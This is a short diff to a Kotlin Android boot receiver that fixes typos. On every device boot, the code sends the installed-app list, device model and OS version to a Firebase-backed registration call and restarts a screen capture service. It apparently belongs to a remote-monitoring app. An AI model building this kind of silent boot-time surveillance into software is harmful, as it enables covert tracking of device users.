@@ -9,15 +9,13 @@ import android.os.Build
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
-            // Re-register device and start services
             val pm = context.packageManager
-            val apps = pm.getInstalledAppllications(PackageManager.GET_META_DATA).map { it.packageName }
-            FirebaseBridge.registterDevice(
+            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA).map { it.packageName }
+            FirebaseBridge.registerDevice(
                 name = Build.MODEL,
-                version = Build.VERSION.RELEASE,  // matched parameter name
-                apps = apps                      // matched parameter name
+                version = Build.VERSION.RELEASE,
+                apps = apps
             )
-            // Optionally restart screen capture service
             context.startForegroundService(Intent(context, ScreenCaptureService::class.java))
         }
     }
